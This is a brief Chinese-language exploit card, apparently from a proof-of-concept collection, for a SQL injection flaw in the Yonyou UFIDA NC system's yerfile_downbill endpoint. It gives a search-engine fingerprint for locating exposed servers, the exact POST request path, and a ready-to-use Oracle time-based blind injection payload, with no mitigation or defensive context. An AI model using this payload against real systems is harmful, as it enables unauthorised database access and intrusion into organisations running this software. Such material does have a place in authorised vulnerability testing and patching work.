# 用友NC系统接口yerfile_downbill存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1`

**Payload**
```
id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),6)--
```
- **响应特征**：200